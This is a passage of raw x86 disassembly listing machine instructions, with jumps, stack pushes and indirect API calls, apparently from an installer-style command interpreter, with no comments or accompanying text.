  4024e9:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4024ec:	58                   	pop    %eax
  4024ed:	83 fe 03             	cmp    $0x3,%esi
  4024f0:	75 0f                	jne    0x402501
  4024f2:	68 00 18 00 00       	push   $0x1800
  4024f7:	57                   	push   %edi
  4024f8:	53                   	push   %ebx
  4024f9:	ff 75 dc             	push   -0x24(%ebp)
  4024fc:	e8 08 0e 00 00       	call   0x403309
  402501:	50                   	push   %eax
  402502:	57                   	push   %edi
  402503:	ff 75 f0             	push   -0x10(%ebp)
  402506:	53                   	push   %ebx
  402507:	ff 75 bc             	push   -0x44(%ebp)
  40250a:	ff 75 08             	push   0x8(%ebp)
  40250d:	ff 15 0c 80 40 00    	call   *0x40800c
  402513:	85 c0                	test   %eax,%eax
  402515:	75 03                	jne    0x40251a
  402517:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40251a:	ff 75 08             	push   0x8(%ebp)
  40251d:	e9 d3 00 00 00       	jmp    0x4025f5
  402522:	68 19 00 02 00       	push   $0x20019
  402527:	e8 52 08 00 00       	call   0x402d7e
  40252c:	6a 33                	push   $0x33
  40252e:	8b f0                	mov    %eax,%esi
  402530:	e8 09 08 00 00       	call   0x402d3e
  402535:	3b f3                	cmp    %ebx,%esi
  402537:	66 89 1f             	mov    %bx,(%edi)
  40253a:	0f 84 e5 03 00 00    	je     0x402925
  402540:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402543:	c7 45 f0 00 08 00 00 	movl   $0x800,-0x10(%ebp)
  40254a:	51                   	push   %ecx
  40254b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40254e:	57                   	push   %edi
  40254f:	51                   	push   %ecx
  402550:	53                   	push   %ebx
  402551:	50                   	push   %eax
  402552:	56                   	push   %esi
  402553:	ff 15 08 80 40 00    	call   *0x408008
  402559:	33 c9                	xor    %ecx,%ecx
  40255b:	41                   	inc    %ecx
  40255c:	85 c0                	test   %eax,%eax
  40255e:	75 2e                	jne    0x40258e
  402560:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402564:	74 13                	je     0x402579
  402566:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  402569:	74 06                	je     0x402571
  40256b:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40256f:	75 1d                	jne    0x40258e
  402571:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402574:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402577:	eb 74                	jmp    0x4025ed
  402579:	ff 37                	push   (%edi)
  40257b:	33 c0                	xor    %eax,%eax
  40257d:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402580:	57                   	push   %edi
  402581:	0f 94 c0             	sete   %al
  402584:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402587:	e8 f7 3e 00 00       	call   0x406483
  40258c:	eb 66                	jmp    0x4025f4
  40258e:	66 89 1f             	mov    %bx,(%edi)
  402591:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402594:	eb 5e                	jmp    0x4025f4
  402596:	68 19 00 02 00       	push   $0x20019
  40259b:	e8 de 07 00 00       	call   0x402d7e
  4025a0:	6a 03                	push   $0x3
  4025a2:	8b f0                	mov    %eax,%esi
  4025a4:	e8 73 07 00 00       	call   0x402d1c
  4025a9:	3b f3                	cmp    %ebx,%esi
  4025ab:	59                   	pop    %ecx
  4025ac:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025af:	66 89 1f             	mov    %bx,(%edi)
  4025b2:	0f 84 6d 03 00 00    	je     0x402925
  4025b8:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025bb:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025c0:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025c3:	74 0c                	je     0x4025d1
  4025c5:	51                   	push   %ecx
  4025c6:	57                   	push   %edi
  4025c7:	50                   	push   %eax
  4025c8:	56                   	push   %esi
  4025c9:	ff 15 04 80 40 00    	call   *0x408004
  4025cf:	eb 1c                	jmp    0x4025ed
  4025d1:	53                   	push   %ebx
  4025d2:	53                   	push   %ebx
  4025d3:	53                   	push   %ebx
  4025d4:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025d7:	53                   	push   %ebx
  4025d8:	51                   	push   %ecx
  4025d9:	57                   	push   %edi
  4025da:	50                   	push   %eax
  4025db:	56                   	push   %esi
  4025dc:	ff 15 30 80 40 00    	call   *0x408030
  4025e2:	85 c0                	test   %eax,%eax
  4025e4:	74 07                	je     0x4025ed
  4025e6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4025ed:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  4025f4:	56                   	push   %esi
  4025f5:	ff 15 10 80 40 00    	call   *0x408010
  4025fb:	e9 c2 05 00 00       	jmp    0x402bc2
  402600:	57                   	push   %edi
  402601:	e8 96 3e 00 00       	call   0x40649c
  402606:	3b c3                	cmp    %ebx,%eax
  402608:	0f 84 b4 05 00 00    	je     0x402bc2
  40260e:	50                   	push   %eax
  40260f:	e9 d7 f9 ff ff       	jmp    0x401feb
  402614:	6a ed                	push   $0xffffffed
  402616:	e8 23 07 00 00       	call   0x402d3e
  40261b:	ff 75 d8             	push   -0x28(%ebp)
  40261e:	ff 75 d4             	push   -0x2c(%ebp)
  402621:	50                   	push   %eax
  402622:	e8 0b 3a 00 00       	call   0x406032
  402627:	83 f8 ff             	cmp    $0xffffffff,%eax
  40262a:	0f 84 f2 02 00 00    	je     0x402922
  402630:	50                   	push   %eax
  402631:	e9 37 ef ff ff       	jmp    0x40156d
  402636:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402639:	33 c9                	xor    %ecx,%ecx
  40263b:	83 fa 38             	cmp    $0x38,%edx
  40263e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402641:	0f 94 c1             	sete   %cl
  402644:	3b c3                	cmp    %ebx,%eax
  402646:	8b f1                	mov    %ecx,%esi
  402648:	74 1b                	je     0x402665
  40264a:	6a 01                	push   $0x1
  40264c:	e8 cb 06 00 00       	call   0x402d1c
  402651:	66 a3 f8 ad 40 00    	mov    %ax,0x40adf8
  402657:	33 c0                	xor    %eax,%eax
  402659:	3b f3                	cmp    %ebx,%esi
  40265b:	59                   	pop    %ecx
  40265c:	0f 94 c0             	sete   %al
  40265f:	89 55 bc             	mov    %edx,-0x44(%ebp)
  402662:	40                   	inc    %eax
  402663:	eb 3f                	jmp    0x4026a4
  402665:	83 fa 38             	cmp    $0x38,%edx
  402668:	75 2b                	jne    0x402695
  40266a:	6a 21                	push   $0x21
  40266c:	e8 cd 06 00 00       	call   0x402d3e
  402671:	68 00 04 00 00       	push   $0x400
  402676:	68 f8 ad 40 00       	push   $0x40adf8
  40267b:	68 f8 b5 40 00       	push   $0x40b5f8
  402680:	e8 d9 3e 00 00       	call   0x40655e
  402685:	83 c4 0c             	add    $0xc,%esp
  402688:	68 f8 ad 40 00       	push   $0x40adf8
  40268d:	ff 15 54 81 40 00    	call   *0x408154
  402693:	eb 0f                	jmp    0x4026a4
  402695:	6a 11                	push   $0x11
  402697:	e8 a2 06 00 00       	call   0x402d3e
  40269c:	50                   	push   %eax
  40269d:	e8 b0 3e 00 00       	call   0x406552
  4026a2:	03 c0                	add    %eax,%eax
  4026a4:	66 39 1f             	cmp    %bx,(%edi)
  4026a7:	89 45 08             	mov    %eax,0x8(%ebp)
  4026aa:	0f 84 75 02 00 00    	je     0x402925
  4026b0:	57                   	push   %edi
  4026b1:	e8 e6 3d 00 00       	call   0x40649c
  4026b6:	0b 75 f0             	or     -0x10(%ebp),%esi
  4026b9:	8b f8                	mov    %eax,%edi
  4026bb:	75 14                	jne    0x4026d1
  4026bd:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026c0:	74 0f                	je     0x4026d1
  4026c2:	57                   	push   %edi
  4026c3:	57                   	push   %edi
  4026c4:	e8 4a 3a 00 00       	call   0x406113
  4026c9:	85 c0                	test   %eax,%eax
  4026cb:	0f 8c 54 02 00 00    	jl     0x402925
  4026d1:	ff 75 08             	push   0x8(%ebp)
  4026d4:	68 f8 ad 40 00       	push   $0x40adf8
  4026d9:	57                   	push   %edi
  4026da:	e8 05 3a 00 00       	call   0x4060e4
  4026df:	e9 d0 ee ff ff       	jmp    0x4015b4
  4026e4:	6a 02                	push   $0x2
  4026e6:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4026e9:	58                   	pop    %eax
  4026ea:	50                   	push   %eax
  4026eb:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4026ee:	e8 29 06 00 00       	call   0x402d1c
  4026f3:	83 f8 01             	cmp    $0x1,%eax
  4026f6:	59                   	pop    %ecx
  4026f7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4026fa:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4026fd:	0f 8c bf 04 00 00    	jl     0x402bc2
  402703:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402708:	3b c1                	cmp    %ecx,%eax
  40270a:	7e 03                	jle    0x40270f
  40270c:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  40270f:	66 39 1f             	cmp    %bx,(%edi)
  402712:	0f 84 5e 01 00 00    	je     0x402876
  402718:	57                   	push   %edi
  402719:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  40271c:	e8 7b 3d 00 00       	call   0x40649c
  402721:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
  402724:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402727:	0f 8e 49 01 00 00    	jle    0x402876
  40272d:	8b 35 58 81 40 00    	mov    0x408158,%esi
  402733:	83 7d cc 39          	cmpl   $0x39,-0x34(%ebp)
  402737:	0f 85 8f 00 00 00    	jne    0x4027cc
  40273d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402740:	53                   	push   %ebx
  402741:	50                   	push   %eax
  402742:	6a 02                	push   $0x2
  402744:	58                   	pop    %eax
  402745:	2b 45 dc             	sub    -0x24(%ebp),%eax
  402748:	50                   	push   %eax
  402749:	8d 45 0a             	lea    0xa(%ebp),%eax
  40274c:	50                   	push   %eax
  40274d:	ff 75 e8             	push   -0x18(%ebp)
  402750:	ff 15 5c 81 40 00    	call   *0x40815c
  402756:	85 c0                	test   %eax,%eax
  402758:	0f 84 18 01 00 00    	je     0x402876
  40275e:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402761:	3b cb                	cmp    %ebx,%ecx
  402763:	0f 84 0d 01 00 00    	je     0x402876
  402769:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  40276e:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402771:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  402774:	89 45 b0             	mov    %eax,-0x50(%ebp)
  402777:	0f 85 b5 00 00 00    	jne    0x402832
  40277d:	8d 45 b0             	lea    -0x50(%ebp),%eax
  402780:	6a 01                	push   $0x1
  402782:	50                   	push   %eax
  402783:	8d 45 0a             	lea    0xa(%ebp),%eax
  402786:	51                   	push   %ecx
  402787:	50                   	push   %eax
  402788:	6a 08                	push   $0x8
  40278a:	53                   	push   %ebx
  40278b:	ff d6                	call   *%esi
  40278d:	85 c0                	test   %eax,%eax
  40278f:	75 68                	jne    0x4027f9
  402791:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  402794:	f7 df                	neg    %edi
  402796:	ff 4d c0             	decl   -0x40(%ebp)
  402799:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  40279e:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027a1:	74 59                	je     0x4027fc
  4027a3:	ff 4d b4             	decl   -0x4c(%ebp)
  4027a6:	47                   	inc    %edi
  4027a7:	6a 01                	push   $0x1
  4027a9:	53                   	push   %ebx
  4027aa:	57                   	push   %edi
  4027ab:	ff 75 e8             	push   -0x18(%ebp)
  4027ae:	ff 15 60 81 40 00    	call   *0x408160
  4027b4:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027b7:	6a 01                	push   $0x1
  4027b9:	50                   	push   %eax
  4027ba:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027bd:	ff 75 c0             	push   -0x40(%ebp)
  4027c0:	50                   	push   %eax
  4027c1:	6a 08                	push   $0x8
  4027c3:	53                   	push   %ebx
  4027c4:	ff d6                	call   *%esi
  4027c6:	85 c0                	test   %eax,%eax
  4027c8:	74 cc                	je     0x402796
  4027ca:	eb 2d                	jmp    0x4027f9
  4027cc:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027cf:	75 16                	jne    0x4027e7
  4027d1:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4027d4:	75 11                	jne    0x4027e7
  4027d6:	53                   	push   %ebx
  4027d7:	ff 75 e8             	push   -0x18(%ebp)
  4027da:	e8 34 39 00 00       	call   0x406113
  4027df:	85 c0                	test   %eax,%eax
  4027e1:	0f 8c 8f 00 00 00    	jl     0x402876
  4027e7:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027ea:	6a 02                	push   $0x2
  4027ec:	50                   	push   %eax
  4027ed:	ff 75 e8             	push   -0x18(%ebp)
  4027f0:	e8 c0 38 00 00       	call   0x4060b5
  4027f5:	85 c0                	test   %eax,%eax
  4027f7:	74 7d                	je     0x402876
  4027f9:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4027fc:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027ff:	75 31                	jne    0x402832
  402801:	66 83 7d c8 0d       	cmpw   $0xd,-0x38(%ebp)
  402806:	74 3b                	je     0x402843
  402808:	66 83 7d c8 0a       	cmpw   $0xa,-0x38(%ebp)
  40280d:	74 34                	je     0x402843
  40280f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402812:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402815:	ff 45 f8             	incl   -0x8(%ebp)
  402818:	66 3b c3             	cmp    %bx,%ax
  40281b:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  40281f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402822:	74 52                	je     0x402876
  402824:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402827:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  40282a:	0f 8c 03 ff ff ff    	jl     0x402733
  402830:	eb 44                	jmp    0x402876
  402832:	0f b7 c0             	movzwl %ax,%eax
  402835:	50                   	push   %eax
  402836:	ff 75 f4             	push   -0xc(%ebp)
  402839:	e8 45 3c 00 00       	call   0x406483
  40283e:	e9 88 03 00 00       	jmp    0x402bcb
  402843:	66 39 45 c8          	cmp    %ax,-0x38(%ebp)
  402847:	74 1b                	je     0x402864
  402849:	66 3d 0d 00          	cmp    $0xd,%ax
  40284d:	74 06                	je     0x402855
  40284f:	66 3d 0a 00          	cmp    $0xa,%ax
  402853:	75 0f                	jne    0x402864
  402855:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402858:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40285b:	ff 45 f8             	incl   -0x8(%ebp)
  40285e:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402862:	eb 12                	jmp    0x402876
  402864:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402867:	6a 01                	push   $0x1
  402869:	f7 d8                	neg    %eax
  40286b:	53                   	push   %ebx
  40286c:	50                   	push   %eax
  40286d:	ff 75 e8             	push   -0x18(%ebp)
  402870:	ff 15 60 81 40 00    	call   *0x408160
  402876:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402879:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40287c:	3b c3                	cmp    %ebx,%eax
  40287e:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  402882:	e9 2f ed ff ff       	jmp    0x4015b6
  402887:	66 39 1f             	cmp    %bx,(%edi)
  40288a:	0f 84 32 03 00 00    	je     0x402bc2
  402890:	6a 02                	push   $0x2
  402892:	e8 85 04 00 00       	call   0x402d1c
  402897:	59                   	pop    %ecx
  402898:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40289b:	ff 75 dc             	push   -0x24(%ebp)
  40289e:	53                   	push   %ebx
  40289f:	50                   	push   %eax
  4028a0:	57                   	push   %edi
  4028a1:	e8 f6 3b 00 00       	call   0x40649c
  4028a6:	50                   	push   %eax
  4028a7:	ff 15 60 81 40 00    	call   *0x408160
  4028ad:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4028b0:	0f 8c 0c 03 00 00    	jl     0x402bc2
  4028b6:	e9 49 02 00 00       	jmp    0x402b04
  4028bb:	57                   	push   %edi
  4028bc:	e8 db 3b 00 00       	call   0x40649c
  4028c1:	3b c3                	cmp    %ebx,%eax
  4028c3:	0f 84 f9 02 00 00    	je     0x402bc2
  4028c9:	50                   	push   %eax
  4028ca:	ff 15 64 81 40 00    	call   *0x408164
  4028d0:	e9 ed 02 00 00       	jmp    0x402bc2
  4028d5:	ff 75 f4             	push   -0xc(%ebp)
  4028d8:	e8 bf 3b 00 00       	call   0x40649c
  4028dd:	3b c3                	cmp    %ebx,%eax
  4028df:	74 12                	je     0x4028f3
  4028e1:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  4028e7:	51                   	push   %ecx
  4028e8:	50                   	push   %eax
  4028e9:	ff 15 68 81 40 00    	call   *0x408168
  4028ef:	85 c0                	test   %eax,%eax
  4028f1:	75 47                	jne    0x40293a
  4028f3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4028fa:	66 89 1f             	mov    %bx,(%edi)
  4028fd:	e9 c0 02 00 00       	jmp    0x402bc2
  402902:	6a 02                	push   $0x2
  402904:	e8 35 04 00 00       	call   0x402d3e
  402909:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  40290f:	51                   	push   %ecx
  402910:	50                   	push   %eax
  402911:	ff 15 6c 81 40 00    	call   *0x40816c
  402917:	83 f8 ff             	cmp    $0xffffffff,%eax
  40291a:	75 15                	jne    0x402931
  40291c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40291f:	66 89 18             	mov    %bx,(%eax)
  402922:	66 89 1f             	mov    %bx,(%edi)
  402925:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40292c:	e9 91 02 00 00       	jmp    0x402bc2
  402931:	50                   	push   %eax
  402932:	ff 75 f4             	push   -0xc(%ebp)
  402935:	e8 49 3b 00 00       	call   0x406483
  40293a:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  402940:	50                   	push   %eax
  402941:	57                   	push   %edi
  402942:	e9 34 01 00 00       	jmp    0x402a7b
  402947:	6a f0                	push   $0xfffffff0
  402949:	c7 45 c8 66 fd ff ff 	movl   $0xfffffd66,-0x38(%ebp)
  402950:	e8 e9 03 00 00       	call   0x402d3e
  402955:	8b f0                	mov    %eax,%esi
  402957:	56                   	push   %esi
  402958:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40295b:	e8 28 35 00 00       	call   0x405e88
  402960:	85 c0                	test   %eax,%eax
  402962:	75 07                	jne    0x40296b
  402964:	6a ed                	push   $0xffffffed
  402966:	e8 d3 03 00 00       	call   0x402d3e
  40296b:	56                   	push   %esi
  40296c:	e8 9c 36 00 00       	call   0x40600d
  402971:	6a 02                	push   $0x2
  402973:	68 00 00 00 40       	push   $0x40000000
  402978:	56                   	push   %esi
  402979:	e8 b4 36 00 00       	call   0x406032
  40297e:	83 f8 ff             	cmp    $0xffffffff,%eax
  402981:	89 45 08             	mov    %eax,0x8(%ebp)
  402984:	0f 84 97 00 00 00    	je     0x402a21
  40298a:	a1 78 a2 42 00       	mov    0x42a278,%eax
  40298f:	8b 35 38 81 40 00    	mov    0x408138,%esi
  402995:	50                   	push   %eax
  402996:	6a 40                	push   $0x40
  402998:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40299b:	ff d6                	call   *%esi
  40299d:	8b f8                	mov    %eax,%edi
  40299f:	3b fb                	cmp    %ebx,%edi
  4029a1:	74 75                	je     0x402a18
  4029a3:	53                   	push   %ebx
  4029a4:	e8 e7 0b 00 00       	call   0x403590
  4029a9:	ff 75 bc             	push   -0x44(%ebp)
  4029ac:	57                   	push   %edi
  4029ad:	e8 c8 0b 00 00       	call   0x40357a
  4029b2:	ff 75 d8             	push   -0x28(%ebp)
  4029b5:	6a 40                	push   $0x40
  4029b7:	ff d6                	call   *%esi
  4029b9:	8b f0                	mov    %eax,%esi
  4029bb:	3b f3                	cmp    %ebx,%esi
  4029bd:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4029c0:	74 34                	je     0x4029f6
  4029c2:	ff 75 d8             	push   -0x28(%ebp)
  4029c5:	56                   	push   %esi
  4029c6:	53                   	push   %ebx
  4029c7:	ff 75 d4             	push   -0x2c(%ebp)
  4029ca:	e8 3a 09 00 00       	call   0x403309
  4029cf:	eb 18                	jmp    0x4029e9
  4029d1:	8b 0e                	mov    (%esi),%ecx
  4029d3:	8b 46 04             	mov    0x4(%esi),%eax
  4029d6:	83 c6 08             	add    $0x8,%esi
  4029d9:	51                   	push   %ecx
  4029da:	03 c7                	add    %edi,%eax
  4029dc:	56                   	push   %esi
  4029dd:	50                   	push   %eax
  4029de:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  4029e1:	e8 07 36 00 00       	call   0x405fed
  4029e6:	03 75 c4             	add    -0x3c(%ebp),%esi
  4029e9:	38 1e                	cmp    %bl,(%esi)
  4029eb:	75 e4                	jne    0x4029d1
  4029ed:	ff 75 f0             	push   -0x10(%ebp)
  4029f0:	ff 15 34 81 40 00    	call   *0x408134
  4029f6:	ff 75 bc             	push   -0x44(%ebp)
  4029f9:	57                   	push   %edi
  4029fa:	ff 75 08             	push   0x8(%ebp)
  4029fd:	e8 e2 36 00 00       	call   0x4060e4
  402a02:	57                   	push   %edi
  402a03:	ff 15 34 81 40 00    	call   *0x408134
  402a09:	53                   	push   %ebx
  402a0a:	53                   	push   %ebx
  402a0b:	ff 75 08             	push   0x8(%ebp)
  402a0e:	6a ff                	push   $0xffffffff
  402a10:	e8 f4 08 00 00       	call   0x403309
  402a15:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402a18:	ff 75 08             	push   0x8(%ebp)
  402a1b:	ff 15 24 81 40 00    	call   *0x408124
  402a21:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  402a24:	6a f3                	push   $0xfffffff3
  402a26:	5e                   	pop    %esi
  402a27:	7d 13                	jge    0x402a3c
  402a29:	6a ef                	push   $0xffffffef
  402a2b:	5e                   	pop    %esi
  402a2c:	ff 75 c0             	push   -0x40(%ebp)
  402a2f:	ff 15 70 81 40 00    	call   *0x408170
  402a35:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a3c:	56                   	push   %esi
  402a3d:	e9 a7 f8 ff ff       	jmp    0x4022e9
  402a42:	53                   	push   %ebx
  402a43:	e8 d4 02 00 00       	call   0x402d1c
  402a48:	8b f8                	mov    %eax,%edi
  402a4a:	59                   	pop    %ecx
  402a4b:	3b 3d ac a2 42 00    	cmp    0x42a2ac,%edi
  402a51:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a54:	0f 83 cb fe ff ff    	jae    0x402925
  402a5a:	8b f7                	mov    %edi,%esi
  402a5c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402a5f:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402a65:	03 35 a8 a2 42 00    	add    0x42a2a8,%esi
  402a6b:	3b c3                	cmp    %ebx,%eax
  402a6d:	7c 19                	jl     0x402a88
  402a6f:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402a72:	75 11                	jne    0x402a85
  402a74:	83 c6 18             	add    $0x18,%esi
  402a77:	56                   	push   %esi
  402a78:	ff 75 f4             	push   -0xc(%ebp)
  402a7b:	e8 bc 3a 00 00       	call   0x40653c
  402a80:	e9 3d 01 00 00       	jmp    0x402bc2
  402a85:	51                   	push   %ecx
  402a86:	eb 7d                	jmp    0x402b05
  402a88:	83 c9 ff             	or     $0xffffffff,%ecx
  402a8b:	2b c8                	sub    %eax,%ecx
  402a8d:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402a90:	74 10                	je     0x402aa2
  402a92:	6a 01                	push   $0x1
  402a94:	e8 83 02 00 00       	call   0x402d1c
  402a99:	59                   	pop    %ecx
  402a9a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a9d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402aa0:	eb 10                	jmp    0x402ab2
  402aa2:	ff 75 e0             	push   -0x20(%ebp)
  402aa5:	8d 46 18             	lea    0x18(%esi),%eax
  402aa8:	50                   	push   %eax
  402aa9:	e8 cb 3a 00 00       	call   0x406579
  402aae:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402ab2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402ab5:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402ab8:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402abb:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402abe:	0f 84 fe 00 00 00    	je     0x402bc2
  402ac4:	57                   	push   %edi
  402ac5:	e8 b3 e6 ff ff       	call   0x40117d
  402aca:	e9 f3 00 00 00       	jmp    0x402bc2
  402acf:	53                   	push   %ebx
  402ad0:	e8 47 02 00 00       	call   0x402d1c
  402ad5:	83 f8 20             	cmp    $0x20,%eax
  402ad8:	59                   	pop    %ecx
  402ad9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402adc:	0f 83 43 fe ff ff    	jae    0x402925
  402ae2:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402ae5:	74 2b                	je     0x402b12
  402ae7:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402aea:	74 12                	je     0x402afe
  402aec:	50                   	push   %eax
  402aed:	e8 a7 e7 ff ff       	call   0x401299
  402af2:	53                   	push   %ebx
  402af3:	53                   	push   %ebx
  402af4:	e8 f6 e6 ff ff       	call   0x4011ef
  402af9:	e9 c4 00 00 00       	jmp    0x402bc2
  402afe:	53                   	push   %ebx
  402aff:	e8 de e7 ff ff       	call   0x4012e2
  402b04:	50                   	push   %eax
  402b05:	ff 75 f4             	push   -0xc(%ebp)
  402b08:	e8 76 39 00 00       	call   0x406483
  402b0d:	e9 b0 00 00 00       	jmp    0x402bc2
  402b12:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b15:	74 15                	je     0x402b2c
  402b17:	8b 15 74 a2 42 00    	mov    0x42a274,%edx
  402b1d:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b20:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402b27:	e9 96 00 00 00       	jmp    0x402bc2
  402b2c:	8b 0d 74 a2 42 00    	mov    0x42a274,%ecx
  402b32:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402b39:	ff 75 f4             	push   -0xc(%ebp)
  402b3c:	e8 38 3a 00 00       	call   0x406579
  402b41:	eb 7f                	jmp    0x402bc2
  402b43:	6a 05                	push   $0x5
  402b45:	e8 e7 3d 00 00       	call   0x406931
  402b4a:	6a 22                	push   $0x22
  402b4c:	8b f0                	mov    %eax,%esi
  402b4e:	e8 eb 01 00 00       	call   0x402d3e
  402b53:	3b f3                	cmp    %ebx,%esi
  402b55:	74 37                	je     0x402b8e
  402b57:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  402b5a:	51                   	push   %ecx
  402b5b:	50                   	push   %eax
  402b5c:	ff 15 a4 82 40 00    	call   *0x4082a4
  402b62:	85 c0                	test   %eax,%eax
  402b64:	7c 28                	jl     0x402b8e
  402b66:	8d 45 08             	lea    0x8(%ebp),%eax
  402b69:	50                   	push   %eax
  402b6a:	53                   	push   %ebx
  402b6b:	ff 75 dc             	push   -0x24(%ebp)
  402b6e:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402b71:	50                   	push   %eax
  402b72:	ff d6                	call   *%esi
  402b74:	85 c0                	test   %eax,%eax
  402b76:	7c 16                	jl     0x402b8e
  402b78:	ff 75 08             	push   0x8(%ebp)
  402b7b:	ff 75 f4             	push   -0xc(%ebp)
  402b7e:	e8 b9 39 00 00       	call   0x40653c
  402b83:	ff 75 08             	push   0x8(%ebp)
  402b86:	ff 15 a8 82 40 00    	call   *0x4082a8
  402b8c:	eb 34                	jmp    0x402bc2
  402b8e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402b91:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402b98:	66 89 18             	mov    %bx,(%eax)
  402b9b:	eb 25                	jmp    0x402bc2
  402b9d:	8b 0d 48 57 42 00    	mov    0x425748,%ecx
  402ba3:	53                   	push   %ebx
  402ba4:	23 c8                	and    %eax,%ecx
  402ba6:	51                   	push   %ecx
  402ba7:	6a 0b                	push   $0xb
  402ba9:	ff 75 f8             	push   -0x8(%ebp)
  402bac:	ff 15 80 82 40 00    	call   *0x408280
  402bb2:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402bb5:	74 0b                	je     0x402bc2
  402bb7:	53                   	push   %ebx
  402bb8:	53                   	push   %ebx
  402bb9:	ff 75 f8             	push   -0x8(%ebp)
  402bbc:	ff 15 7c 82 40 00    	call   *0x40827c
  402bc2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402bc5:	01 05 08 a3 42 00    	add    %eax,0x42a308
  402bcb:	33 c0                	xor    %eax,%eax
  402bcd:	5f                   	pop    %edi
  402bce:	5e                   	pop    %esi
  402bcf:	5b                   	pop    %ebx
  402bd0:	c9                   	leave
  402bd1:	c2 04 00             	ret    $0x4
  402bd4:	cd 2b                	int    $0x2b
